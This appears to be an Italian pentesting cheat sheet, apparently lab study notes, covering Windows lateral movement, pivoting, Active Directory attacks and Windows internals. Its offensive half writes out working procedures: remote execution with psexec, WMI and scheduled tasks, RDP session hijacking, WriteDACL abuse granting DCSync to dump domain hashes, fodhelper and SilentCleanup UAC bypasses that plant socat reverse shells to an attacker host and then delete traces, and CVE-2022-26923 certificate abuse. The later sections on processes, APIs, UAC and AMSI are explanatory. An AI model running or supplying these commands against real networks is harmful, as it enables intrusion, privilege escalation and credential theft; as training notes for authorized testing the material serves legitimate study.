##### Lanciare comandi da remoto:

- __Psexec64:__

_Caricando sulla macchina che abbiamo o se gia presente il tool psexec64.exe (integrato nella suite sysinternal di windows), permette di poter lanciare comandi da remoto, richiede di far parte degli Administrator group_

_Comandi:_
<!---->
       psexec64.exe \\<ip macchina> -u <user> -p <password> -i <commando> #comando per lanciare da remoto, i doppi backslash sono per quando utilizzamo SMB sennò basta mettere ip normale
<!---->
- __WinRM:__

_WinRm permette di poter utilizzare una shell o lanciare comandi powershell sempre da remoto, il gruppo richiesto è quello dei Remote Managemnet Users:_ 

_Comandi:_
<!---->
        $username = '<user>';
        $password = '<passowrd>';
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
        $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; #comando per creare l'oggetto PSSCredential
<!---->       
        Enter-PSSession -Computername <ip> -Credential $credential #comando per entrate nella sessione
<!---->       
        Invoke-Command -Computername <ip> -Credential $credential -ScriptBlock {whoami} #comando per lanciare altri comandi da remoto
<!---->

- __SC.exe:__

_sc.exe permette di creare processi da remoto e lo fa tramite DCE/RPC:_

 1) connessione alla porta 135 che è quella del EPM(Endpoint Mapper) un servizio del protocollo DCE/RPC che indica indirizzo e la porta per un servizio, EPM.

 2) EPM indica ip e porta (range da 49152 a 65535) del SVCCTL (Service Control Manager Interface) APi per comunicare con il service control manager

 2.2) se la connessione tramite RPC fallisce il client prova tramite SMB named pipes o SMB con Netbios.

 _Comandi:_
<!-- -->
       sc.exe \\<ip> create <nome servizio> binPath= "<path binario>" #comando per creare il servizio
<!-- -->       
       sc.exe \\<ip> start <nome servizio> #comando per startarlo
<!-- -->       
       sc.exe \\<ip> stop <nome servizio> #comando per stopparlo
<!-- -->       
       sc.exe \\<ip> delete <nome servizio> #comando per eliminarl9
<!-- -->

- __Task scheduler:__

_Tramite schtasks possiamo creare dei tasks da remoto che a determinato tempo si ripetono, gruppo richiesto Administrators group_

_Comandi:_
<!-- -->
       schtasks /s <ip> /RU "SYSTEM" /create /tn "<nome task>" /tr "<comando>" /sc ONCE /sd 01/01/1970 /st 00:00 #comando per creare tasj
<!-- -->     
       schtasks /s <ip> /run /TN "<nome task>"  #comando per avviarlo
<!-- -->       
       schtasks /S <ip> /TN "<nome task>" /DELETE /F #comando per eliminarlo
<!-- -->

- __WMI:__

_WMI(Windows Management Instrumentation) è utilizzato per la gestione delle risorse locali e di rete, possiamo persino creare processi,servizi e schedule tasks e fa tutto questo da remoto tramite 2 protocolli DCOM (RPC over IP) o Wsman (WinRM); gruppo richiesto Administrators group._

_Porte 135, 49152-65535 (DCERPC) DCOM è un'estensione del DCERPC_

_5985/TCP (WinRM HTTP) o 5986/TCP (WinRM HTTPS)_

_Comandi per creare una sessione:_
<!-- -->
       $username = '<user>';
       $password = '<passowrd>';
       $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
       $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; #comando per creare l'oggetto PSSCredential
<!-- -->
       $Opt = New-CimSessionOption -Protocol DCOM #comando che crea un'oggetto CIM in cui è specificato il protocollo DCOM 
       $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop #comando che crea le session CMI
       #CMI è strettamente correlato con WMI
<!-- -->

_Comandi per creare un processo da remoto:_
<!-- -->
       $Command = "<comando da inserire>"; #variabile contente il processo
ES:
powershell.exe -Command Set-Content -Path C:\Windows\hello.txt -Value hello
<!-- -->
       Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
       CommandLine = $Command } #comando per creare il processo
<!-- -->   
       wmic.exe /user:<nome utente> /password:<password> /node:<ip> process call create <comando>" #stesso comando ma per CMD
<!-- -->   

_Comandi per creare un servizio da remoto:_
<!-- --> 
       Invoke-CimMethod -CimSession <sessione> -ClassName Win32_Service -MethodName Create -Arguments @{
       Name = "<nome servizio";
       DisplayName = "<nome>";
       PathName = "<comando>";
       ServiceType = [byte]::Parse("16"); # Win32OwnProces
       StartMode = "Manual"
       } #comando con relativi dettagli per creare un servizio
<!-- --> 
       $Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'" #variabile che contiene informzioni per creare l'handle del servizio
<!-- --> 
       Invoke-CimMethod -InputObject $Service -MethodName StartService/StopService/Delete #comando che preso l'handle e avvia/ferma/elimina il servizio
<!-- --> 
_Comandi per creare un task da remoto:_
<!-- --> 
       $Command = "<comando o eseguibile>" 
       $Args = "<argomenti del comando>" #commando e argomenti vanno divisi e inseriti in variabili d'ambiente
<!-- -->        
       $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args # comando per lacreazione dell'azione dello schedule
<!-- -->        
       Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "<nome task>" #commando per laregistrazione della task
<!-- -->        
       Start-ScheduledTask -CimSession $Session -TaskName "<nome task>" #comando che avvia il task
<!-- -->       
       Unregister-ScheduledTask -CimSession $Session -TaskName "<nome task>" #comando per eliminarlo
<!-- --> 

_Comandi per installare un nostro MSI installer:_ 
<!-- --> 
       Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "<path installer>"; Options = ""; AllUsers = $false}
       #comando per insttalre un nostro MSI
<!-- --> 
       wmic /node:<ip> /user:<eventuale dominio>\<utente> product call install PackageLocation=<Path installer> #stesso comando ma per CMD
<!-- --> 

- __RDP hijacking:__

_RDP hijacking funziona se vi è una connessione RDP dove è chiusa ma non è stato fatto il logout e quindi solo con il reboot del server si chiude definitivamente e infine funziona sulle versioni di windows server 2016, nella 2019 richiede la password._

_Commandi:_
<!-- -->
      #runnato con privilegi di SYSTEM
      query user #query delle sessioni attive, se nell'output notiamo una sessione in state DISC significa che è vulnerabile
<!-- -->     
OUPUT di esempio:
<!-- -->
      USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
      administrator         rdp-tcp#6           3  Active          .  6/3/2023 5:09 AM
      serverAdmin                               4  Disc            .  6/7/2023 7:51 AM
<!-- -->
      tscon 4 /dest:rdp-tcp#6 #comando per dire di legare la sessione di id 4 all nostra che è la 3
<!-- -->
##### __Port Forwarding:__

_Tramite tecniche di port forwarding in diverse maniere è possibile fare pivoting, tra macchine target_

__N.B: si suppone che si abbia compromesso almeno una macchina per poter applicare le seguenti metodologie.__

- _SSH Tunneling:_

  1) _Remote port Forwarding:_
 
__N.B: i comandi ssh utilizzati vengono lanciati dalla macchina compromessa verso la nostra kali.__
  
_Comandi:_
<!-- -->
      useradd <nome user> -m -d <path directory user> -s <shell da utilizzare> #comando per creare un'utente sulla propria machine e verrà utilizzato per la connessione SSH
<!-- -->      
      passwd <password> #comando per impostare password
<!-- -->
      ssh <nome utente>@<ip> -R <porta aperta della propria machine>:<ip remoto>:<porta target> -N  #comando che si connette alla nostra macchina e che poi binda una porta remota con la        propria porta, -N per creare solo la connessione
<!-- -->
ES:

ssh user@3.2.1.9 -R 3389:3.2.2.2:3389 -N /3389 porta RDP/

xfreerdp /v:127.0.0.1 /u:user /p:passwd123

  1) _Local port Forwarding:_

__N.B: i comandi ssh utilizzati vengono lanciati dalla macchina compromessa verso la nostra kali.__

_Comandi:_
<!-- -->
       ssh <nome utente>@<ip> -L *:<porta della propria macchina>:<ip localhost target>:<porta target> -N #comando che si connetta alla nostra macchina, mette in ascolto tutte le                interfacce di rete disponibili e che poi binda la nostra porta con quella target
<!-- -->
       netsh advfirewall firewall add rule name="<nome regola>" dir=<specifica direzione> action=<azione> protocol=<protocollo> localport=<porta> #comando per modificare le regole del    
       firewall della nostra kali machine, a seconda del tunneling creato
<!-- -->
ES:

ssh user#3.2.1.9 -L *:80:127.0.0.1:80 -N

_Ci andremo a connettere prima alla nostra kali machine per poi creare un socket __"*.80"__ su tutte le interfaccie di rete disponibili che si collegano alla 80, per poi bindarla con __"127.0.0.1:80"__ la porta 80 della macchina su cui è stato lanciato il comando SSH con il proprio indirizzo quindi quello di loopback._

netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80

_Verrà creato una regola che permette connessioni in ingresso alla porta 80._

- _Socat Forwarding:_

_Socat può essere utilizzato quando SSH non è disponibile_

__N.B: va caricato sulla macchina compromessa e può essere maggiormente rilevabile rispetto al semplice SSH.
i comandi  utilizzati vengono lanciati dalla macchina compromessa verso la nostra kali.__
 
_Comandi:_
<!-- -->
       socat TCP4-LISTEN:<port macchina compromessa>,fork TCP4:<ip target>:<porta target> #comando per bindare una porta con socat e in seguito visitarla tramite browser
<!-- -->
ES:

socat TCP4-LISTEN:3389,fork TCP4:3.5.4.3:3389

_Andremo a bindare la porta della 3389 della macchina compromessa alla 3389 del ip specificato, per poi poterla visitare tramite browser_

TCP4-LISTEN:80,fork TCP4:<ip_della_nostra_macchina>:80

_Andremo a bindare la porta 80 della macchina compromessa alla 80 della nostra kali machine._

### DACL attacks:
_viene riportata una lista/metodologia di attacchi alla discretionary access list tramite delle misconfigurazioni:_

##### WriteDACL
_Viene sfruttata la misconfigurazione di poter editare la DACL, crei un user, lo aggiungiamo ai gruppi __"Remote Management Users"__ per controllare l'utente a distanza, al gruppo
__"Exchange Windows Permissions"__ gruppo dell'Active Directory che permette di modificare i permessi di dominio, infine importiamo powerView e tramite il comando __"Add-DomainObjectAcl"__ con __"-rights"__ DCSync potremmo dumpare tutti gli hash di dominio con secretsdump._
<!-- -->
       New-LocalUser <nome_account> -Password (echo "<password>" | convertTo-SecureString -AsPlainText -force) -FullName "<nome_completo>" -Description "<descrizione>"
<!---->
      _Add-localGroupMember -Group "Remote Management Users" -member tester4_
<!-- -->
      Add-localGroupMember -Group "Exchange Windows Permissions" -Member <nome_utente>
<!-- -->
_Questo comando aggiunge un ACL oggetto all'ACL list per un utente a dominio  con diritti DSync che permettono di dumpare tutti gli hash a dominio:_
<!-- -->
      Add-DomainObjectAcl -targetidentity "DC=<subdomain>, DC=<top_level_domain>" -principalidentity <nome_utente> -Rights DCSync -verbose
<!-- -->
### Bypass

##### Bypass UAC

__Per sapere cos'è l'UAC e come funziona andare [qui](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#uac)__

- Caso di compromissione GUI:

1) msconfig.exe: 

_cliccando tasto windows+R, scrivendo e aprendo msconfig e infine aprendo __processhacker__ potremmo notare che msconfig runna con un high token, grazie alla sua autoelevation apre direttamente il programma con i più alti privilegi e se andiamo nella sezione __tools__ del programma, cerchiamo command prompt potremmo ottenere una shell con permessi elevati._

2) azman.msc __(vecchia utility winserver 2003 utilizzata per gestire i permessi)__:

_aprendo esegui, avviando azman.msc anche esso avrà l'autoelevation che quindi utilizzerà un high IL, andando poi su __help o ?__ cliccando su guida e poi continuando con un click destro e selezionando __HTML o source code__ potremmo notare che si aprira notepad.exe, ora basterà semplicemente cercare l'eseguibile cmd.exe per avere la nostra shell con privilegi alti._ 

3) mmc.exe:

_Funziona anche con mmc.exe anche esso avrà l'autoelevation che quindi utilizzerà un high IL, andando poi su __help o ?__ cliccando su guida e poi continuando con un click destro e selezionando __HTML o source code__ potremmo notare che si aprira notepad.exe, ora basterà semplicemente cercare l'eseguibile cmd.exe per avere la nostra shell con privilegi alti._

- Caso di compromissione AutoElevation:

1) fodhelper __(executable di windows per le lingue)__:

_Avviando possiamo notare che avrà un IL high, usando procmon.exe possiamo osservare che il sistema operativo va a ricercare quale software utilizzare per aprire fodhelper questo perchè nei sistemi operativi Windows esiste il ProgID cioè ad un'estensione è associata un programma di default ed è specificato in genere all'interno della chiave HKEY_CLASSES_ROOT che è un'insieme delle chiavi (HKCU e HKEY).
Nell'exploit possiamo notare che nella HKCU, più precisamente nella subykey con questo path __"shell/open/command"__ è dove viene anche specificato il ProgID possiamo  bypassare la system wide association(data un estensione tipo .txt, utilizziamo programma/i di default) andando ad inserire una revshell nella subkey, cosi facendo otteremo una shell privilegiata perchè lo stessto programma è avviato con IL high:_
__N.B: è importante almeno essere nel gruppo amministratori per poter editare i registri.__

Commandi:
<!-- -->
      net user <nome utente> | find "Local Group" #comando per vedere il gruppo di appartenenza 
<!-- -->
      whoami /groups | find "Label" #comando per capire il proprio IL
<!-- -->
      set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command #settare una variabile d'ambiente con il path specificato 
<!-- -->
      set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<ip>:<porta> EXEC:cmd.exe,pipes" #comando che crea una variabile d'ambiente che crea al suo interno un socat per       la revshell
<!-- -->
      reg add %REG_KEY% /v "DelegateExecute" /d "" /f #viene aggiunta la chiave di registro.
      /v specifica il nome 
      /d i dati all'interno
      /f force per evitare ogni prompt di conferma
<!-- -->
      reg add %REG_KEY% /d %CMD% /f #comando per inserire la revshell
<!-- -->
      nc -lnvp <port> #comando per aprire listener sulla nostra macchine
<!-- -->
      fodhelper.exe #comando per avviare l'eseguibile
<!-- -->
      reg delete HKCU\Software\Classes\ms-settings\ /f #comando per eliminare e quindi pulire le tracce
<!-- -->
_Dopo aver fatto tutti i comandi ed infine avviato l'eseguibile e se avremmo anche aperto un listener dovremmo ottenere la revshell con un IL high._

2) fodhelper con AV attivo:

_abbiamo l'AV attivo bene per bypassare l'antivirus viene messa appunto una strategia efficare tramite l'utilizzo di Curver entry(Curver entry è utilizzato quando si hanno più istanze di uno stesso software ma di diverse versioni, curver permette a Windows di utilizzare la versione di default)._

Commandi:
<!-- -->
      set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<ip>:<port> EXEC:cmd.exe,pipes" #comando per la revshell
<!-- -->
      reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f #creiamo la subkey .thm con all'interno la revshell
<!-- -->
      reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f #creiamo la subkey curver che punta alla subkey .thm contenente la revshell
<!-- -->
      nc -lnvp <port> #creiamo il listener
<!-- -->
      fodhelper.exe #startiamo l'eseguibile
<!-- -->
Abbiamo ottenuto la revshell con IL high anche se attivo l'antivirus

Possono sorgere dei problemi se nelle UAC settings è attiva l'opzione Always Notify perchè ogni modifica deve essere autorizzata esempio l'exploit di fodhelper
però c'è ancora un modo per bypassare UAC è tramite gli scheduler task, che sono avviati da utenti normali ma eseguiti con privilegi d' amministratore e il tampering di variabili d'ambiente.

- Bypass tramite scheduler:

1) DiskCleanup:

_Andando a visionare lo scheduler task e cercano il DiskCleanup possiamo notare che ogni utente può utilizzarlo e verrà eseguito con privilegi di amministratore
N.B(la voce __"Run with highest privileges"__  eredita IL da chi lo avvia quindi da un'utente non-admin avrà IL medium).
Andando poi nella sezione __"Actions"__ possiamo notare che runna il programma tramite comando cmd e fin qui tutto normalre, tranne per le variabili d'ambiente che possono essere modificate a nostro vantaggio._

Comandi:
<!-- -->
      reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<ip>:<port> EXEC:cmd.exe,pipes &REM" /f
      #crea una subkey con nome windire che simula la varible d'ambiente %windir% e che poi ha al suo interno una revshell il $REM serve a commentare il resto
<!-- -->
      nc -lnvp <port> #comando per il listener
<!-- -->
      schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I #avvia il task con la revshell 
<!-- -->
      reg delete "HKCU\Environment" /v "windir" /f #comando per eliminare la subkey creata in precendenza
<!-- -->
_Esiste un tool chiamato [UACME](https://github.com/hfiref0x/UACME) che automatizza il bypass dell'UAC._

##### Bypass AMSI:

### CVE Active Directory:

##### CVE-2022-26923 (Vulnerabilità sui certificati dell'AD)
<!-- -->
   _La vulnerabilità sfrutta la misconfigurazione dei certificati nell'AD e la possibilità che un utente può aggiungere fino a 10 macchine al gruppo machine    dell'active directory, esitono 2 template quello User e quello machine, lo User non è sfruttabile in quanto non possiamo modificare i parametri del __UPN__ (User Principal Name) che si trova dentro al __SAN__ (Subjec ALternative Name) invece nel template machine, dopo aver aggiunto un nuova macchina al gruppo dei computer possiamo generare un certificato in cui cambiamo il DNS hostname con quello del domain controller e ottenere NTLM Hash._
<!-- --> 
_Comandi:_
<!-- -->
      . ./Certify.exe find /vulnerable #per verificare se vulnerabile
<!-- -->
      sudo certipy-ad req -u '<username/nome_pc>@<dominio>' -p '<password>' -dc-ip <ip_del_domain_controller> -template <tipo_di_certificato> -ca       
      <dominio_certificate_autority> #comando per generare un certificato /#se selezionamo il template machine, al computer aggiunto va scritto un $ alla fine del       nome
<!-- -->
      certipy-ad auth -pfx <file configurazione>.pfx #fa la convalida del certificato interrogando il kerberos e prova a recuperare NTLM hash dell'account con impacket
<!-- -->
_Comandi powershell per modificare le proprità di un computer nell'AD:_ 
<!-- -->
      impacket-addcomputer '<dominio>/<username>:<password>' -method LDAPS -computer-name '<nome_da_scegliere>' -computer-pass '<password_da_scegliere>'
      #aggiungere il computer al gruppo della machine di active directory 
<!-- -->
      Get-ADComputer <nome computer> -properties dnshostname,serviceprincipalname
<!-- -->
      Set-ADComputer THMPC -ServicePrincipalName @{}#importante rendere vuoto SPN perchè entra in conflitto con quello dell'active directory
<!-- -->
      Set-ADComputer <nome dominio> -DnsHostName <nome del completo del dominio>
<!-- -->
_Rigenerare il certificato di template machine e tramite __Certipy auth__ prendere NTLM hash e il gioco è fatt0._
<!-- -->

### Note Pentest
_WebDav protocollo che estende HTTP per la connessione in remoto._

_DavWWWRoot è una parola speciale riconosciuta dalla windows shell, utilizzata quando si vuole connettere ad un WebDav server, questa parola
specifica di voler connettersi alla root del server._

_SPN(Service Principal Name) sono identificatori nell'AD per identificare dei servizi o risorse come un server SQL._

_Commando per avviare il subsystem di linux._
<!-- -->
      Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
<!-- -->
# Windows:

### Processi di avvio

_Schema per semplificare la spiegazione dei processi:_

_system (Primo processo, colui che da il via a tutto)_

Sytem crea:

- _smss.exe (Session Manager Subsystem ,processo che crea nuove sessioni e variabili d'ambiente, si termina da solo)_

smss.exe crea:
          
- _win32k.sys (kernel mode, si occupa della GUI di windows)_
  
- _winsrv.dll (user mode, gestisce le attività legate alla creazione, gestione e interazione con il desktop di Windows)_
  
- _csrss.exe (user mode, responsabile della Win32 console, creazione e eliminazione di thread, rende disponibile le API ad altri processi)_

csrss.exe crea:

- _winlogon.exe (session 1, sessione utente si occupa del logon e logoff utenti)_

- _wininit.exe (session 0, una sessione isolata per il sistema operativo windows, si occupa dell'avvio)_

wininit.exe crea:

- _explorer.exe (si occuppa dell'accesso a file e cartelle per l'utente)_

- _lsass.exe (Local Security Authority) e lsaiso.exe(processo collegato con credential guard and keyguard, si vede solo se attivo)_

- _services.exe (Service control manager, si occupa di tutto quello che riguarda i servizi)_

services.exe crea:

- _svchost.exe (Host process, si occupa di ospitare e controllare un servizio, è completamnte gestito da services.exe)_

_Approfondimenti per gli eseguibli sopra elencati:_ 

_services.exe:_
gestisce un DB con i vari servizi ed è possibile interrogarlo con l'eseguibile __"sc.exe"__, inoltre troviamo altre informazioni nelle chiavi di registro __"HKLM\System\CurrentControlSet\Services"__ è anche responsabile al settaggio del __LastKnownGood__ (Una sorta di backup per windows).

_svchost.exe:_
I servizi runnati da questo processo sono implementati come DLL e sono immagazzinate nella subkey __Parameters__ a questo path __"KLM\SYSTEM\CurrentControlSet\Services\SERVICE NAME\Parameters"__, per vederli basta fare click desto su process hacker, notiamo il servizio che runna, se rifacciamo click destro su __"Proprietà"__, otterremo maggiori info, una cosa è importante che vi sia la flag -k che è il key identifier.

_Tools:_

Vari sono i tool per tenere d'occhio i processi, noi ne elenchiamo alcuni:

- process hacker

- procmon dell suite dei sysinternal

- TaskManager integrato in windows
(__N.B è consigliato nella sezione __"Details"__ di aggiungere le colonne "Image Path Name" e "Command Line"
per vedere cosa un processo fa e il suo path__)

### API

_I programmi molte volte hanno bisogno di comunicare con la componente hardware o con il sistema stesso di windows è cosi che nascono le Win 32 Api, librerie che fanno da interfaccia tra la user-mode delle applicazione e il kernel._

__N.B: esistono tue tipi di accesso all'hardware: User-mode(no accesso diretto all'hardware, propria locazione di memoria) Kernel-mode(Accesso diretto ad hardware e memoria fisica).__

__Componenti delle API:__

- Header file: Definisce le librerie da importare durante il run-time, il programma a cui servono utilizzerà dei puntatori per reperirle.

- Core DLLs: gruppo di DLL che definisco la struttura di chiamate.
 ES:(KERNEL32, USER32, ADVAPI32) queste definiscono i servizi user e kernel. 

- DLLs supplementari: DLL che controllano parti del subsystem di windows OS, sono 36.

- Call Structures: Definisce la API stessa e i parametri da passargli.
  ES:
  
<!-->
      BOOL WriteProcessMemory(
      [in]  HANDLE  hProcess,
      [in]  LPVOID  lpBaseAddress,
      [in]  LPCVOID lpBuffer,
      [in]  SIZE_T  nSize,
      [out] SIZE_T  *lpNumberOfBytesWritten
      );
<!-->

- API Calls: chiamate della API utilizzate in un programma con l'indirizzi alle funzioni

- Input output parametri: il valore definito dalle call structures

_Ogni API call della libreria WIN32 risiede in RAM e ogni call richiede un puntatore a un indirizzo di memoria, perà il tutto è oscurato dall'ASLR(Address Space Layout Randomization) che comunque alla fine può essere bypassato con vari metodi tipo:_

- Header file (windows.h):

quando questo header file è incluso nel nostro Unmanaged program(cioè il nostro programma, compilato e runnato) ogni funzione di win32 può essere chiamata per    durante il run-time il loader, capisce qualle chiamate vengono utilizzate, creando una sorta di tabella con i vari indirizzi di memoria o puntatori di indirizzi per le funzioni.

- P/Invoke: altro metodo, come primo passo importiamo la DLL che ci serve, poi definiamo un managed method (metodo controllato dall'OS) come esterno che potremo richiamare come vorremmo.

__Esempio codice di un'API:__

- Dichiarazione e riempito dei parametri di un'API call:
<!-->
    HWND hwnd = CreateWindowsEx(
       	0, 
       	CLASS_NAME, 
       	L"Hello THM!", 
       	WS_OVERLAPPEDWINDOW, 
       	CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, 
       	NULL, 
       	NULL, 
       	hInstance, 
       	NULL
       	);
<!-->

__Implementazione API in .NET e powershell:__
<!-->
    class Win32 {
     	[DllImport("kernel32")]
     	public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
     }
     
    static void Main(string[] args) {
     	bool success;
     	StringBuilder name = new StringBuilder(260);
     	uint size = 260;
     	success = GetComputerNameA(name, ref size);
     	Console.WriteLine(name.ToString());
     }
<!-->
    $MethodDefinition = @"
        [DllImport("kernel32")] #importiamo la DLL
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); #importiamo la api call
        [DllImport("kernel32")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    "@; #in powershell vanno definite dentro ad un metodo,
<!-->
    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru; #va creato un nuvo tipo per i puntatori di win32DLL. inoltre verrà creato un       file temporaneo che compilerà queste DLL con csc.exe.
<!-->
    Win32.Kernel32]::<Imported Call>() #comando per utilizzarle
<!-->
### Register Keys

_il Registro di sistema (o Registro Windows) è un database gerarchico che contiene le impostazioni, le configurazioni e altre informazioni cruciali per il corretto funzionamento del sistema operativo e delle applicazioni installate è organizzato in key e subkeys le quali sono:_

 - HKEY_CLASSES_ROOT (HKCR):
   _Questa chiave contiene le associazioni tra estensioni di file e programmi, e definisce come le applicazioni si comportano quando si lavora con tipi di file specifici e in realtà e un 
   insieme delle chiavi HCKU e HKLM_

 - HKEY_CURRENT_USER (HKCU):
   _Questa chiave contiene le impostazioni specifiche dell'utente che sta effettuando l'accesso al sistema. Ad esempio, impostazioni personalizzate, preferenze, stampanti e altro ancora._

 - HKEY_LOCAL_MACHINE (HKLM):
   _Questa chiave contiene le impostazioni relative al computer locale. Qui sono presenti informazioni sul software installato, hardware, configurazioni di sistema e altro ancora._

 - HKEY_USERS (HKU):
   _Questa chiave contiene i profili degli utenti attualmente registrati sul computer. Ogni utente avrà un sottoalbero in questa chiave, simile alla struttura di HKCU._

 - HKEY_CURRENT_CONFIG (HKCC):
   _Questa chiave contiene informazioni sulla configurazione hardware attuale del computer. Viene creato dinamicamente durante l'avvio del sistema._

__Sono importanti da conoscere perchè da lato attaccante possono causare bei danni, dal lato difesa possono essere fonti di informazioni per capire eventuali attacchi ricevuti.__

### UAC

_UAC(User Access Control) utilizzato per non fare eseguire codice o script malevoli, in quanto richiede i priviliegi di amministratore, è anche all'interno delle MIC(Mandatory Integrity Control) un meccanismo che assegna a utenti,gruppi e processi un IL(Integrity Level) più è alto il livello e più puoi fare cose nel sistema_

_per comprendere appieno l'UAC prima bisogna capire cosa è IL(Integrity Level) e la sua divisione in 4 livelli:_

- Low = utilizzo solo dell'explorer dei file
- Medium = per utenti normali e amministratori con il filtered token
- High = amministratorti con elevated token
- System = livello utilizzato dal utente system

_Ogni IL è poi assegnato ad un UAC token che può essere di diversi tipi:_

 Non-administrators = singolo token utilizzato dagli utenti a IL medium

 Administrators hanno 2 token a loro volta:
   
   - Filtered Token= token per amministratori con meno priviliegi ha IL medium
   - Elevated Token= token con i pieni priviliegi IL hard

_Ora possiamo passare al suo funzionamento parlando in maniera dettagliata dei vari passaggi che la contraddistinguono:_

1) l'utente richiede di runnare un'applicazione come amministratore
2) viene fatta la chiamata alle api ShellExecute che impostando il runas verb apre una shell per elevare i privilegi e in questo modo attivare il meccanismo di
   UAC
3) la richiesta viene girata al service AppInfo.exe che a sua volta andrà a controllare l'application manifest per checkare una possibile autoelevation
4) verrà poi runnato consent.exe che permette di elevare i privilegi, consent.exe verrà runnato in un secure desktop, un desktop che isola i processi per evitare la compromissione dell'UAC
5) l'esito se positivo farà in modo che il nuovo processo creato punti alla shell creata in precendenza per elevare i privilegi.

_Sopra se notiamo bene viene menzionata l'autoelevation, bene è una peculiarità sempre correlata alla user access control e riguarda gli eseguibili i quali possono essere avviati senza il controllo da parte dell'UAC però devono soddisfare dei requisiti:_

- Firmati da Windows Publisher (infatti quasi tutte le funzionalità del pannello di controllo e alcuni eseguibili rientrano nell'autoelevetion)
- essere all'interno di directory fidate come C:\WINDOWS\System32 o C:\Program files

_Ulteriori info per l'autoelevation:_

-.exe devono aver segnato l'autoElevate nel proprio manifest __tool per il controllo del manifest è sigcheck N.B(va scaricata la suite dei sysinternals)__
<!-- -->
      C:\path di sigcheck.exe -m <Path eseguibile da vedere> #comando per leggere il manifest
<!-- -->
- .mmc.exe(microsoft management console) a seconda poi degli .msc snap richiesti ma in genere ha l'autoelevation

__N.B: la UAC può essere modificate nella voce __"UAC settings".____

### AMSI

L'AMSI (Anti-Malware Scan Interface) è un runtime detection che scannerizza il codice prima che venga runnato e determina se malevolo o meno, viene avviato da defender e evita che lo script malevolo venga runnato nel .NET runtime ed è completamente integrato con:

- _User Account Control, or UAC_
  
- _PowerShell_
  
- _Windows Script Host (wscript and cscript)_
  
- _JavaScript and VBScript_
  
- _Office VBA macros_

__

### Note sulla sicurezza in Windows

_SID(Security Identifier) aggiunto a utente,gruppi,domini o a qualsiasi altro entità di sicurezza, viene utilizzato per gestire l'accesso alle risorse_

ES:
_S-1-5-21-674899381-4069889467-2080702030-1002_

_SAM(Security account manager) database interno che contiene le informazioni dei vari utenti come password, hash e nomi utenti, è utilizzato dal LSA(lsass.exe) per l'autenticazione._

_ACL(Access control list) e ACE (Access control entrie) le ACE le troviamo dentro l'ACL, le ACE possono avere diverse regole come: deny o allow e si applicano su risorse e utenti._

_AppLocker permette un controllo granulare di script e dll, permette di aggiungere delle regole sempre su di loro._

_Local group policy utilizzato per le policy di sicurezza dei gruppi._

_MMC(Microsoft management console) interfaccia gui che permette di aggiungere degli snaps-in(moduli) che estendono le funzionalitè del MMC che ha il compito di monitorare risorse hardware e software._

_WMI è un sottosistema di powershell, che fornisce informazioni dettagliate sul sistema operativo, l'hardware, il software e altre risorse del computer per il system monitoring, fa da framework comune perchè presente sulle varie versioni di Windows_



